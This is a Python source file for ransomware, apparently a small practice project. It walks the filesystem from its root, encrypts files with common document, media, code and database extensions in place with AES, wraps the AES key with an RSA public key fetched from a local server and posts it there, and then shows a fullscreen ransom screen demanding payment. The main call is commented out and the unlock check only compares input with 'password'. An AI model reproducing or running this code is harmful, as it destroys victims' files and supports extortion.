from tkinter import messagebox
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from tkinter import *
import requests

import os
import tkinter as tk

AES_key = get_random_bytes(32)

filetype_set = {".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx",
 ".pdf", ".txt", ".jpg", ".jpeg", ".png", ".gif", ".bmp",
".tif", ".tiff", ".mp4", ".avi", ".mp3", ".wav", ".zip",
".rar", ".7z", ".sql", ".mdb", ".db", ".bak", ".php", ".html",
".asp", ".aspx", ".js", ".java", ".py", ".c", ".cpp", ".cs",
".odt", ".ods", ".ini", ".cfg", ".log", ".iso"}


    
    
def seek_and_encrypt():
    root_directory = os.path.abspath(os.sep)
    for dir_path, dir_names, file_names in os.walk(root_directory):
    #for dir_path, dir_names, file_names in os.walk(os.getcwd()):
        for filename in file_names:
            file_extension = os.path.splitext(filename)[1]
            if file_extension in filetype_set:
                encrypt_file(dir_path + filename)
        #print(files.path.splitext()[1])


       
def encrypt_file(file_path):
    
    f = open(file_path,"r+b")
    file_data = f.read()
    nonce = get_random_bytes(8)
    cipher = AES.new(AES_key, AES.MODE_CTR, nonce=nonce)
    encrypted_data = cipher.encrypt(file_data)
    
    f.seek(0)
    f.write(nonce)
    f.write(encrypted_data)
    f.truncate()
    f.close()
    
def decrypt_file(file_path):
    f = open(file_path,"r+b")
    nonce = f.read(8)
    encrypted_data = f.read()
    cipher = AES.new(AES_key, AES.MODE_CTR, nonce=nonce)
    decrypted_data = cipher.decrypt(encrypted_data)
    
    f.seek(0)
    f.write(decrypted_data)
    f.truncate()
    f.close()
    pass

def recieve_pub_key():
    request = requests.get("http://localhost:8000/key")
    return request.json()["key"]
    
    
def encrypt_and_send_ransom_key():
    pub_key = RSA.importKey(recieve_pub_key())
    cipher_rsa = PKCS1_OAEP.new(pub_key)
    encrypted_ransomkey = cipher_rsa.encrypt(AES_key)
    
    response = requests.post("http://localhost:8000/bad_day_key", data= encrypted_ransomkey)
    print(response.status_code)
    print(response.text)

def klick():
    print("button klicked")

def run_ui():
    root = tk.Tk()
    root.title("You Have Been Ransomwared")
    root.attributes("-fullscreen", True)
    root.configure(bg="black")


    frame = tk.Frame(root, bg='black')
    frame.place(relx=0.5, rely=0.5, anchor='center')


    label = tk.Label(
        frame, 
        text="All your files have been encrypted.\nPay one billion dollars to unlock your files",
        font=("Arial", 24), 
        fg="red", 
        bg="black"
    )
    label.pack(pady=20)

    key_entry = tk.Entry(frame, font=("Arial", 18), width=30)
    key_entry.pack(pady=10)


    def check_key():
        entered_key = key_entry.get()
        if entered_key == "password":
            messagebox.showinfo("Success", "Correct key! Your files are decrypted.")
            root.destroy()
        else:
            messagebox.showerror("Error", "Incorrect key! Your files remain encrypted.")
    

    check_button = tk.Button(
        frame, 
        text="Enter Key to Decrypt", 
        command=check_key, 
        font=("Arial", 18), 
        bg="green", 
        fg="white"
    )
    check_button.pack(pady=10)


    def pay_ransom():
        messagebox.showinfo("Payment", "swish 1 billion dollars to 0713371337")
    
    pay_button = tk.Button(
        frame, 
        text="Pay Ransom", 
        command=pay_ransom, 
        font=("Arial", 40), 
        bg="red", 
        fg="white"
    )
    pay_button.pack(pady=10)


    def exit_ransomware():
        messagebox.showinfo("Payment", "exiting this window will \nmake it impossible to retrieve your files")
    
    exit_button = tk.Button(
        frame, 
        text="Exit", 
        command=exit_ransomware, 
        font=("Arial", 18), 
        bg="gray", 
        fg="white"
    )
    exit_button.pack(pady=10)


    root.mainloop()


if __name__ == "__main__":
    def main():
        seek_and_encrypt()
        encrypt_and_send_ransom_key()
        run_ui()

    
#main()